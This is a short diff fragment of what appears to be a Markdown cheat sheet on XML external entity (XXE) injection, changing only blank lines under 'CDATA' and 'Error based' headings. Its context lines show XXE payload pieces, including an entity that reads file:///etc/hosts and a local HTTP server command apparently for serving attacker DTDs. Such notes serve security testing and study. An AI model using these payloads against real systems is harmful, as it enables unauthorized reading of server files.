@@ -181,7 +181,6 @@ python -m http.server 1337
 
 
 #### CDATA
-
 CDATA is raw content, e.g.
 ```xml
 <!DOCTYPE email [
@@ -212,7 +211,6 @@ Send:
 ```
 
 #### Error based
-
 Just broke a tag or local file path:
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/hosts">
